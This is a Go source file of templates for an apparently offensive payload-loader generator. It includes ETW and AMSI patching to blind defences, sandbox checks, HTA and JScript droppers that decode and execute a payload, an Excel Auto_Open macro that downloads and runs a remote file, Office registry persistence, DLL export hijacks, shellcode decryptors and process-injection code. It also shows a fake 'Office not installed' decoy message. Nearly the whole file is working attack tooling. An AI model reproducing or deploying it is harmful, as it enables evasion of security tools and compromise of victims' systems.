package Struct

func Sandbox() string {
	return `
	func {{.Variables.IsDomainJoined}}() (bool, error) {
		var {{.Variables.domain}} *uint16
		var {{.Variables.status}} uint32
		err := syscall.NetGetJoinInformation(nil, &{{.Variables.domain}}, &{{.Variables.status}})
		if err != nil {
			return false, err
		}
		syscall.NetApiBufferFree((*byte)(unsafe.Pointer({{.Variables.domain}})))
		return {{.Variables.status}} == syscall.NetSetupDomainName, nil
	}
	`
}

func Sandbox_DomainJoined() string {
	return `
	var {{.Variables.checker}} bool
		{{.Variables.checker}}, _ = {{.Variables.IsDomainJoined}}()
	if {{.Variables.checker}} == true {
	} else {
		os.Exit(3)
	}`
}

func JS_Office_Export() string {
	return `
	//export xlAutoOpen
	func xlAutoOpen() {
		Run()
	}`
}

func JS_Control_Export() string {
	return `
	//export CPlApplet
	func CPlApplet() {
		Run()
	}`
}

func WS_JS_Export() string {
	return `
	//export DllRegisterServer
	func DllRegisterServer() {
		Run()
	}

	//export DllGetClassObject
	func DllGetClassObject() {
		Run()
	}

	//export DllUnregisterServer
	func DllUnregisterServer() {
		Run()
	}`
}

func WScript_Sandbox() string {
	return `
	var {{.Variables.objShell}} = new ActiveXObject("Shell.Application")
	var {{.Variables.domain}} =  {{.Variables.objShell}}.GetSystemInformation("IsOS_DomainMember");
	if ({{.Variables.domain}} == 0 ){
	}
	else {
		{{.Variables.loader}}
	}
`
}

func HTA() string {
	return `<HTML>
	<HEAD>
	</HEAD>
	<BODY>
	<script language="javascript" >
	window.resizeTo(0,0);
	{{.Variables.payload}}
	window.close();
	</script>
	</BODY>
	</HTML>
`
}

func HTA_WScript() string {
	return `<HTML>
	<HEAD>
	</HEAD>
	<BODY>
	<script language="javascript" >
	window.resizeTo(0,0);
	try {
		var {{.Variables.RNZyt}} = window.document.location.pathname;
		var {{.Variables.fos}} = new ActiveXObject("Scri"+"pting.FileSy"+"stemObject");
		var {{.Variables.bogusWindows1252Chars}} = "\u20AC\u201A\u0192\u201E\u2026\u2020\u2021\u02C6\u2030\u0160\u2039\u0152\u017D\u2018\u2019\u201C\u201D\u2022\u2013\u2014\u02DC\u2122\u0161\u203A\u0153\u017E\u0178";
		var {{.Variables.correctLatin1Chars}} = "\u0080\u0082\u0083\u0084\u0085\u0086\u0087\u0088\u0089\u008A\u008B\u008C\u008E\u0091\u0092\u0093\u0094\u0095\u0096\u0097\u0098\u0099\u009A\u009B\u009C\u009E\u009F";
		var {{.Variables.obshell}} = new ActiveXObject("Sh"+"ell.App"+"lication");
		var {{.Variables.pathworks}} = new ActiveXObject("Wscri"+"pt.shell");
		var {{.Variables.dest}} = {{.Variables.pathworks}}.ExpandEnvironmentStrings("%TEMP%") + "\\{{.Variables.filename}}";

		function binaryString(str)
		{
			var r = str ? new String(str) : new String();
			r.byteAt = function(index)
			{
				var value = this.charCodeAt(index);
				if (value > 0xff)
				{
					var p = {{.Variables.bogusWindows1252Chars}}.indexOf(this.charAt(index));
					value = {{.Variables.correctLatin1Chars}}.charCodeAt(p);
				}
				var hex = value.toString(16);
				return (hex.length == 2) ? hex : "0" + hex;
			};
			return r;
		}
		function {{.Variables.fromByte}}(hex)
		{
			var c = String.fromCharCode(parseInt(hex, 16));
			var p = {{.Variables.correctLatin1Chars}}.indexOf(c);
			return (p == -1) ? c : {{.Variables.bogusWindows1252Chars}}.charAt(p);
		}
		function {{.Variables.decode}}()
		{
			var {{.Variables.chunkSize}} = 8192;
			var {{.Variables.source}} = "{{.Variables.payload}}";
			var {{.Variables.decodedFile}} = {{.Variables.fos}}.OpenTextFile({{.Variables.dest}}, 2, true);
			var {{.Variables.hexString}} = {{.Variables.source}};
				var tempArray = new Array();
				for (var i = 0; i < {{.Variables.hexString}}.length; i += 2)
				{
					tempArray[i >> 1] = {{.Variables.fromByte}}({{.Variables.hexString}}.substring(i, i + 2));
				}
				var s = tempArray.join("");
				if (s.length > 0)
				{
					{{.Variables.decodedFile}}.Write(s);
				}
			{{.Variables.decodedFile}}.Close();
		}

		function {{.Variables.sleep}}(milliseconds) {
		  var start = new Date().getTime();
		  for (var i = 0; i < 1e7; i++) {
			if ((new Date().getTime() - start) > milliseconds){
			  break;
			}
		  }
		}

		{{.Variables.decode}}();
		{{.Variables.obshell}}.ShellExecute("C:\\Windows\\Sysnative\\wscript.exe",""+{{.Variables.dest}}+"","","",0);
		}
		catch (err){
			}
	window.close();
	</script>
	</BODY>
	</HTML>
`
}

func JS_Office_Sub() string {
	return `

	var {{.Variables.fso}} = new ActiveXObject("Scrip"+"ting.FileS"+"ystemObject");
	var {{.Variables.dropPath}} = {{.Variables.fso}}.GetSpecialFolder(2);
	var {{.Variables.objapp}} = new ActiveXObject("{{.Variables.RegName}}.Application");
	{{.Variables.objapp}}.Visible = false;
	var {{.Variables.Application_Version}} = {{.Variables.objapp}}.Version;
	var {{.Variables.WshShell}} = new ActiveXObject("WScript.Shell");
	var {{.Variables.strRegPath}} = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + {{.Variables.Application_Version}} + "\\{{.Variables.RegName}}\\Options\\OPEN";
	var {{.Variables.value}} = ""+{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}";
	{{.Variables.WshShell}}.RegWrite({{.Variables.strRegPath}},{{.Variables.value}}, "REG_SZ");
	var {{.Variables.objShell}} = new ActiveXObject("shell.application");
    {{.Variables.objShell}}.ShellExecute("{{.Variables.ApplicationName}}", "", "", "open", 0);
	WScript.Sleep(40000);

	{{.Variables.WshShell}}.RegDelete({{.Variables.strRegPath}});
	{{.Variables.WshShell}}.RegDelete("HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + {{.Variables.Application_Version}} + "\\{{.Variables.RegName}}\\Resiliency\\StartupItems\\");

	`
}

func JS_Control_Sub() string {
	return `
	var {{.Variables.objShell}} = new ActiveXObject("sh"+"ell.applic"+"ation");
    {{.Variables.objShell}}.ShellExecute({{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}", "", "", "", 1);
	`
}

func JS_Msiexec_Sub() string {
	return `
	var {{.Variables.objShell}} = new ActiveXObject("she"+"ll.appl"+"ication");
    {{.Variables.objShell}}.ShellExecute("C:\\Windows\\{{.Variables.System32}}\\msiexec.exe", "/z "+{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}", "", "", 1);
	`
}

func JSfile() string {
	return `
	try {

	var {{.Variables.fso}} = new ActiveXObject("Scripti"+"ng.FileSys"+"temObject");
	var {{.Variables.dropPath}} = {{.Variables.fso}}.GetSpecialFolder(2);

    var {{.Variables.base6411}}={ {{.Variables.characters}}:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function({{.Variables.atest}}){ {{.Variables.base6411}}.{{.Variables.characters}};var {{.Variables.rtest}}="",{{.Variables.ctest}}=0;do{var {{.Variables.etest}}={{.Variables.atest}}.charCodeAt({{.Variables.ctest}}++),{{.Variables.ttest}}={{.Variables.atest}}.charCodeAt(c++),{{.Variables.htest}}=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,{{.Variables.rtest}}+={{.Variables.base6411}}.{{.Variables.characters}}.charAt(s)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(A)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(o)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(B)}while(c<a.length);return {{.Variables.rtest}}}};
    function {{.Variables.Magic1}}({{.Variables.rtest}}){if(!/^[a-z0-9+/]+={0,2}$/i.test({{.Variables.rtest}})||{{.Variables.rtest}}.length%4!=0)throw Error("failed");for(var t,e,n,o,i,a,f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",h=[],d=0;d<{{.Variables.rtest}}.length;d+=4)t=(a=f.indexOf({{.Variables.rtest}}.charAt(d))<<18|f.indexOf({{.Variables.rtest}}.charAt(d+1))<<12|(o=f.indexOf({{.Variables.rtest}}.charAt(d+2)))<<6|(i=f.indexOf({{.Variables.rtest}}.charAt(d+3))))>>>16&255,e=a>>>8&255,n=255&a,h[d/4]=String.fromCharCode(t,e,n),64==i&&(h[d/4]=String.fromCharCode(t,e)),64==o&&(h[d/4]=String.fromCharCode(t));return {{.Variables.rtest}}=h.join("")}
    function {{.Variables.binaryWriter}}({{.Variables.res1}},{{.Variables.filename1}})
    {var {{.Variables.base6411}}decoded={{.Variables.Magic1}}({{.Variables.res1}});var {{.Variables.TextStream11}}=new ActiveXObject('A'+'D'+'O'+'D'+'B'+'.'+'S'+'t'+'r'+'e'+'a'+'m');{{.Variables.TextStream11}}.Type=2;{{.Variables.TextStream11}}.charSet='iso-8859-1';{{.Variables.TextStream11}}.Open();{{.Variables.TextStream11}}.WriteText({{.Variables.base6411}}decoded);var {{.Variables.BinaryStream}}=new ActiveXObject('A'+'D'+'O'+'D'+'B'+'.'+'S'+'t'+'r'+'e'+'a'+'m');{{.Variables.BinaryStream}}.Type=1;{{.Variables.BinaryStream}}.Open();{{.Variables.TextStream11}}.Position=0;{{.Variables.TextStream11}}.CopyTo({{.Variables.BinaryStream}});{{.Variables.BinaryStream}}.SaveToFile({{.Variables.filename1}},2);{{.Variables.BinaryStream}}.Close()}

    {{.Variables.dll}}

	{{.Variables.binaryWriter}}({{.Variables.dllvar}},{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}");
	{{.Variables.Loader}}

}catch(e) {
}
`
}

func Macro() string {
	return `Sub Auto_Open()
    Dim {{.Variables.pathOfFile}} As String
    Dim {{.Variables.Full}} As String
    Dim {{.Variables.t}} As String
    {{.Variables.pathOfFile}} = Environ("AppData") & "\Microsoft\Excel\"
    VBA.ChDir {{.Variables.pathOfFile}}

    Dim {{.Variables.remoteFile}} As String
    Dim {{.Variables.storeIn}} As String
    Dim {{.Variables.HTTPReq}} As Object

    {{.Variables.remoteFile}} = "{{.Variables.URL}}{{.Variables.outFile}}"
    {{.Variables.storeIn}} = "{{.Variables.outFile}}"
    Set {{.Variables.HTTPReq}} = CreateObject("Microsoft.XMLHTTP")
    {{.Variables.HTTPReq}}.Open "GET", {{.Variables.remoteFile}}, False
    {{.Variables.HTTPReq}}.send

	If {{.Variables.HTTPReq}}.Status = 200 Then
        Set {{.Variables.output}} = CreateObject("ADODB.Stream")
        {{.Variables.output}}.Open
        {{.Variables.output}}.Type = 1
        {{.Variables.output}}.Write {{.Variables.HTTPReq}}.responseBody
        {{.Variables.output}}.SaveToFile {{.Variables.storeIn}}, 2
        {{.Variables.output}}.Close
    End If
    {{.Variables.Full}} = {{.Variables.pathOfFile}} & {{.Variables.storeIn}}
    Set {{.Variables.obj}} = GetObject("new:0006F03A-0000-0000-C000-000000000046")
	{{.Variables.obj}}.CreateObject("WScript.Shell").Run("c" & "s" & "c" & "r" & "i" & "p" & "t" & " //E:jscript " & {{.Variables.Full}}), 0
	{{.Variables.sleep}}
	Kill {{.Variables.Full}}
	End Sub
	Sub {{.Variables.sleep}}()
	Dim when As Variant
		Debug.Print "Start " & Now
		when = Now + TimeValue("00:00:30")
		Do While when > Now
			DoEvents
		Loop
		Debug.Print "End " & Now
	End Sub
`
}

func WS_JS() string {
	return `
	var {{.Variables.manifest}} = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?> <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"> 	<assemblyIdentity type="win32" name="{{.Variables.DLLName}}" version="0.0.0.0"/> 	<file name="{{.Variables.FileName}}{{.Variables.dllext}}">     	<comClass         	description="Description"         	clsid="{89565276-A714-4a43-912E-978B935EDCCC}"         	threadingModel="Both"         	progid="{{.Variables.progid}}"/> 	</file>  </assembly>';

	var {{.Variables.ax}} = new ActiveXObject("Microsoft.Windows.ActCtx");
	{{.Variables.ax}}.ManifestText = {{.Variables.manifest}};
	var {{.Variables.Execute}} = {{.Variables.ax}}.CreateObject("{{.Variables.progid}}");
`
}

func AESDecrypt_Function() string {
	return `
func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
		{{.Variables.length}} := len({{.Variables.src}})
		{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
	}

func {{.Variables.FuncName}}() []byte {
	{{.Variables.ciphertext}}

	{{.Variables.vciphertext}}, _ := hex.DecodeString({{.Variables.fullciphertext}})
	{{.Variables.vkey}}, _ := hex.DecodeString("{{.Variables.key}}")
	{{.Variables.viv}}, _ := hex.DecodeString("{{.Variables.iv}}")


	{{.Variables.block}}, _ := aes.NewCipher({{.Variables.vkey}})

	{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
	{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
	{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
	{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})

	return {{.Variables.stuff}}
}


`
}
func RCFDecrypt_Function() string {
	return `
	func {{.Variables.FuncName}}() []byte {
	{{.Variables.ciphertext}}
	ciphertext, _ := hex.DecodeString({{.Variables.fullciphertext}})
	key, _ := hex.DecodeString("{{.Variables.key}}")

	cipher, err := rc4.NewCipher(key)
	if err != nil {
		return nil
	}

	{{.Variables.raw_bin}} := make([]byte, len(ciphertext))
	cipher.XORKeyStream({{.Variables.raw_bin}}, ciphertext)

	return {{.Variables.raw_bin}}

}
	`
}

func ELZMADecrypt_Function() string {
	return `
	func {{.Variables.FuncName}}() []byte {
	{{.Variables.ciphertext}}
	var {{.Variables.buff}} bytes.Buffer
	{{.Variables.hexdata}}, _ := hex.DecodeString({{.Variables.fullciphertext}})

	{{.Variables.buff2}} := bytes.NewBuffer({{.Variables.hexdata}})

	{{.Variables.clear}}, {{.Variables.err}} := xz.NewReader({{.Variables.buff2}})
	if {{.Variables.err}} != nil {
		log.Fatalf("NewReader error %s", {{.Variables.err}})
	}
	io.Copy(&{{.Variables.buff}} , {{.Variables.clear}})
	{{.Variables.raw_bin}} := {{.Variables.buff}}.Bytes()
	return {{.Variables.raw_bin}}
}
	`
}

func Imports() string {
	return `
	{{.Variables.CPORT}}

	import (
		{{.Variables.debugpeimport}}
		"encoding/base64"
		{{.Variables.HEX_Import}}
		{{.Variables.DebugImport}}
		"[loader]/[loader]"
		"strconv"
		{{.Variables.fmt}}
		"syscall"
		"unsafe"
		{{.Variables.Time_Import}}
		{{.Variables.SandboxOS}}


		{{.Variables.Windows_Import}}
		"golang.org/x/sys/windows/registry"
		{{.Variables.AdditionalImports}}
	)
	`
}

func Console() string {
	return `

	func {{.Variables.Console}}(show bool) {
		{{.Variables.getWin}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.GetConsoleWindowName}}"))
		{{.Variables.showWin}} := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.ShowWindowName}}"))
		{{.Variables.hwnd}}, _, _ := {{.Variables.getWin}}.Call()
		if {{.Variables.hwnd}} == 0 {
			return
		}
		if show {
		var {{.Variables.SW_RESTORE}} uintptr = 9
		{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_RESTORE}})
		} else {
		var {{.Variables.SW_HIDE}} uintptr = 0
		{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_HIDE}})
		}
	}

`
}

func Header() string {
	return `
	package main

	{{.Variables.Imports}}


	const (
		{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
	)
	var _ unsafe.Pointer
	var (
		{{.Variables.customsyscall}} uint16
		{{.Variables.customsyscallVP}} uint16
		{{.Variables.number}} int = {{.Variables.b64number}}
	)

	{{.Variables.Debug}}

	{{.Variables.Sandboxfunction}}

	func {{.Variables.Versionfunc}}() string {
		{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		{{.Variables.Version}}, _, _ :=  {{.Variables.k}}.GetStringValue("CurrentVersion")
		{{.Variables.MV}}, _, err := {{.Variables.k}}.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			//{{.Variables.MinV}}, _, _ := {{.Variables.k}}.GetIntegerValue("CurrentMinorVersionNumber")
			{{.Variables.Version}} = strconv.FormatUint({{.Variables.MV}}, 10)
		}
		defer {{.Variables.k}}.Close()
		if {{.Variables.Version}} == "10" {
			{{.Variables.customsyscall}} = 0x18
			{{.Variables.customsyscallVP}} = 0x50
		} else if {{.Variables.Version}} == "6.3" {
			{{.Variables.customsyscall}} = 0x17
			{{.Variables.customsyscallVP}} = 0x4f
		} else if {{.Variables.Version}} == "6.2" {
			{{.Variables.customsyscall}} = 0x16
			{{.Variables.customsyscallVP}} = 0x4e
		} else if {{.Variables.Version}} == "6.1" {
			{{.Variables.customsyscall}} = 0x15
			{{.Variables.customsyscallVP}}= 0x4d
		}
		return {{.Variables.Version}}

	}

	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
		var {{.Variables.decoded}} []byte
			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
		{{.Variables.sum}} := 1
		for i := 1; i < {{.Variables.number}}; i++ {
			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
			{{.Variables.sum}} += i
		}
		return string({{.Variables.decoded}})

	}

	{{.Variables.Console_Function}}

	{{.Variables.WriteProcessMemory_Function}}

	{{.Variables.ETW_Function}}

	{{.Variables.AMSI_Function}}

	var procReadProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc("ReadProcessMemory")

	func {{.Variables.FindAddress}}() uintptr {
		var funcNtAllocateVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc("NtAllocateVirtualMemory")
		handle := uintptr(0xffffffffffffffff)
		num := 2
		var add uintptr
		AllAddr := funcNtAllocateVirtualMemory.Addr()
		for i := 0; i < 20; i++ {
			rawr, _, _ := ReadProcessMemory(handle, AllAddr+uintptr(i), uintptr(num))
			f := fmt.Sprintf("%0x", rawr)
			if f == "0f05" {
				add = AllAddr + uintptr(i)
				return add
			}
		}
		return add
	}

	func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, nSize uintptr) (lpBuffer []uint8, lpNumberOfBytesRead int, ok bool) {
		var nBytesRead int
		buf := make([]uint8, nSize)
		ret, _, _ := procReadProcessMemory.Call(
			uintptr(hProcess),
			lpBaseAddress,
			uintptr(unsafe.Pointer(&buf[0])),
			nSize,
			uintptr(unsafe.Pointer(&nBytesRead)),
		)

		return buf, nBytesRead, ret != 0
	}

	`

}

func DLL_Refresher() string {
	return `
	{{.Variables.Header}}

	{{.Variables.ExportName}}
	{{.Variables.ExportFunction}}

	func main() {
	}


	//export Run
	func Run() {
		{{.Variables.Sandbox}}
		{{.Variables.ETW}}
		{{.Variables.AMSI}}
		{{.Variables.Version}} := {{.Variables.Versionfunc}}()
		if {{.Variables.Version}} == "10" {
			{{.Variables.Reloading}}
		}
		{{.Variables.ETW}}
		{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()

		{{.Variables.Shellcode_Exec_Function}}({{.Variables.raw_bin}})
	}

	{{.Variables.Shellcode_Exec}}


	{{.Variables.ReloadFunction}}

`
}

func Binary() string {
	return `
	{{.Variables.Header}}

	func main() {

		{{.Variables.Sandbox}}
		{{.Variables.ETW}}
		{{.Variables.AMSI}}
		time.Sleep({{.Variables.SleepSecond}} * time.Millisecond)
		{{.Variables.Version}} := {{.Variables.Versionfunc}}()
		{{.Variables.VersionMessage}}
		if {{.Variables.Version}} == "10" {
			{{.Variables.Reloading}}
		}
		{{.Variables.ETW}}
		{{.Variables.hide}}
		{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()

		go syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(
			uintptr(0),
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("Microsoft Office is not installed on your PC. Please install Microsoft Office to view this document."))),
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("Microsoft Office is not installed"))),
			uintptr(0x00000010))

		{{.Variables.Shellcode_Exec_Function}}({{.Variables.raw_bin}})
	}

	{{.Variables.Shellcode_Exec}}

	{{.Variables.ReloadFunction}}
`
}

func WriteProcessMemory_Function() string {
	return `
	const (
		{{.Variables.errnoERROR_IO_PENDING}}= 997
	)
	var {{.Variables.errERROR_IO_PENDING}} error = syscall.Errno({{.Variables.errnoERROR_IO_PENDING}})
	var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.WriteProcessMemoryName}}"))


	func {{.Variables.WriteProcessMemory}}({{.Variables.hProcess}} uintptr, {{.Variables.lpBaseAddress}} uintptr, {{.Variables.lpBuffer}} *byte, {{.Variables.nSize}} uintptr, {{.Variables.lpNumberOfBytesWritten}} *uintptr) (err error) {
		r1, _, e1 := syscall.Syscall6({{.Variables.procWriteProcessMemory}}.Addr(), 5, uintptr({{.Variables.hProcess}}), uintptr({{.Variables.lpBaseAddress}}), uintptr(unsafe.Pointer({{.Variables.lpBuffer}})), uintptr({{.Variables.nSize}}), uintptr(unsafe.Pointer({{.Variables.lpNumberOfBytesWritten}})), 0)
		if r1 == 0 {
			if e1 != 0 {
				err = {{.Variables.errnoErr}}(e1)
			} else {
				err = syscall.EINVAL
			}
		}
		return
	}

	func {{.Variables.errnoErr}}(e syscall.Errno) error {
		switch e {
		case 0:
			return nil
		case {{.Variables.errnoERROR_IO_PENDING}}:
			return {{.Variables.errERROR_IO_PENDING}}
		}

		return e
	}
	`
}

func ETW_Function() string {
	return `
	var {{.Variables.procEtwNotificationRegister}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwNotificationRegisterName}}"))
	var {{.Variables.procEtwEventRegister}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwEventRegisterName}}"))
	var {{.Variables.procEtwEventWriteFull}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwEventWriteFullName}}"))
	var {{.Variables.procEtwEventWrite}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwEventWriteName}}"))

	func {{.Variables.ETW}}() {
		{{.Variables.handle}} := uintptr(0xffffffffffffffff)
		{{.Variables.dataAddr}} := []uintptr{ {{.Variables.procEtwNotificationRegister}}.Addr(), {{.Variables.procEtwEventRegister}}.Addr(), {{.Variables.procEtwEventWriteFull}}.Addr(), {{.Variables.procEtwEventWrite}}.Addr()}
		for i, _ := range {{.Variables.dataAddr}} {
			{{.Variables.data}}, _ := hex.DecodeString("4833C0C3")
			var {{.Variables.nLength}} uintptr
			{{.Variables.datalength}} := len({{.Variables.data}})
			{{.Variables.WriteProcessMemory}}({{.Variables.handle}}, {{.Variables.dataAddr}}[i], &{{.Variables.data}}[0], uintptr(uint32({{.Variables.datalength}})), &{{.Variables.nLength}})
		}
	}

	func {{.Variables.RemoteETW}}({{.Variables.handle}} windows.Handle) {
		{{.Variables.dataAddr}} := []uintptr{ {{.Variables.procEtwNotificationRegister}}.Addr(), {{.Variables.procEtwEventRegister}}.Addr(), {{.Variables.procEtwEventWriteFull}}.Addr(), {{.Variables.procEtwEventWrite}}.Addr()}
		for i, _ := range {{.Variables.dataAddr}} {
			{{.Variables.data}}, _ := hex.DecodeString("4833C0C3")
			var {{.Variables.nLength}} uintptr
			{{.Variables.datalength}} := len({{.Variables.data}})
			{{.Variables.WriteProcessMemory}}(uintptr({{.Variables.handle}}), {{.Variables.dataAddr}}[i], &{{.Variables.data}}[0], uintptr(uint32({{.Variables.datalength}})), &{{.Variables.nLength}})
		}
	}

`
}

func AMSI_Function() string {
	return `
	func {{.Variables.AMSI}}() {
		var {{.Variables.handle}} uint64
		{{.Variables.handle}} = 0xffffffffffffffff
		{{.Variables.ll}}, _ := windows.LoadLibrary(string([]byte{'a','m','s','i','.','d','l','l'}))
		{{.Variables.addr}}, _ := windows.GetProcAddress({{.Variables.ll}}, string([]byte{'a','m','s','i','S','c','a','n','B','u','f','f','e','r'}))
		{{.Variables.data}}, _ :=  hex.DecodeString("B857000780C3")
		var {{.Variables.nLength}} uintptr
		{{.Variables.datalength}} := len({{.Variables.data}})
		{{.Variables.WriteProcessMemory}}(uintptr({{.Variables.handle}}), uintptr(uint({{.Variables.addr}})), &{{.Variables.data}}[0], uintptr(uint32({{.Variables.datalength}})), &{{.Variables.nLength}})
	}
	`
}

func Procces_Injection() string {
	return `
var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc("WriteProcessMemory")
var {{.Variables.funcNtCreateThreadEx}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtCreateThreadEx")
var {{.Variables.funcNtWriteVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtWriteVirtualMemory")
var {{.Variables.funcNtAllocateVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtAllocateVirtualMemory")
var {{.Variables.funcNtProtectVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc("NtProtectVirtualMemory")

var {{.Variables.procEnumProcessModules}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("EnumProcessModules")
var {{.Variables.procGetModuleBaseName}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("GetModuleBaseNameW")
var {{.Variables.procGetModuleInformation}} = syscall.NewLazyDLL(string([]byte{'p', 's', 'a', 'p', 'i',})).NewProc("GetModuleInformation")

func errno(e1 error) error {
	if e1, ok := e1.(syscall.Errno); ok && e1 == 0 {
		e1 = syscall.EINVAL
	}
	return e1
}

type SyscallError struct {
	call string
	err  error
}

func (e *SyscallError) Error() string {
	return fmt.Sprintf("%s: %v", e.call, e.err)
}

const (
	MEM_FREE    = 0x100 << 8
	MEM_COMMIT  = 0x10 << 8
	MEM_RESERVE = 0x20 << 8
)

type StartupInfoEx struct {
	windows.StartupInfo
	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
}
type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  *uint64
	entries  []*PROC_THREAD_ATTRIBUTE_ENTRY
}
type PROC_THREAD_ATTRIBUTE_ENTRY struct {
	attribute *uint32
	cbSize    uintptr
	lpValue   uintptr
}

type MemoryBasicInfo struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

type MODULEINFO struct {
	LpBaseOfDll uintptr
	SizeOfImage uint32
	EntryPoint  uintptr
}

func {{.Variables.CreateProcess}}() *syscall.ProcessInformation {
	var {{.Variables.si}} syscall.StartupInfo
	var {{.Variables.pi}} syscall.ProcessInformation

	{{.Variables.Target}} := "{{.Variables.processpath}}"
	{{.Variables.commandLine}}, {{.Variables.err}} := syscall.UTF16PtrFromString({{.Variables.Target}})

	if {{.Variables.err}} != nil {
		panic({{.Variables.err}})
	}
	var {{.Variables.startupInfo}} StartupInfoEx
	{{.Variables.si}}.Cb = uint32(unsafe.Sizeof({{.Variables.startupInfo}}))
	{{.Variables.si}}.Flags |= windows.STARTF_USESHOWWINDOW
	{{.Variables.si}}.ShowWindow = windows.SW_HIDE

	{{.Variables.err}} = syscall.CreateProcess(
		nil,
		{{.Variables.commandLine}},
		nil,
		nil,
		false,
		0,
		nil,
		nil,
		&{{.Variables.si}},
		&{{.Variables.pi}})

	if {{.Variables.err}} != nil {
		panic({{.Variables.err}})
	}

	return &{{.Variables.pi}}
}
func {{.Variables.GetModuleInformation}}({{.Variables.hProcess}} windows.Handle, {{.Variables.hModule}} windows.Handle) (MODULEINFO, error) {
	{{.Variables.mi}} := MODULEINFO{}
	_, _, {{.Variables.err}} := {{.Variables.procGetModuleInformation}}.Call(
		uintptr({{.Variables.hProcess}}),
		uintptr({{.Variables.hModule}}),
		uintptr(unsafe.Pointer(&{{.Variables.mi}})),
		uintptr(uint32(unsafe.Sizeof({{.Variables.mi}}))))
	if {{.Variables.err}}.(syscall.Errno) != 0 {
		return {{.Variables.mi}}, {{.Variables.err}}
	}
	return {{.Variables.mi}}, nil
}

func {{.Variables.GetModuleBaseName}}({{.Variables.process}} windows.Handle, {{.Variables.module}} windows.Handle, {{.Variables.outString}} *uint16, {{.Variables.size}} uint32) ({{.Variables.n}} int, err error) {
	r1, _, e1 := {{.Variables.procGetModuleBaseName}}.Call(
		uintptr({{.Variables.process}}),
		uintptr({{.Variables.module}}),
		uintptr(unsafe.Pointer({{.Variables.outString}})),
		uintptr({{.Variables.size}}),
	)
	if r1 == 0 {
		return 0, errno(e1)
	}
	return int(r1), nil
}

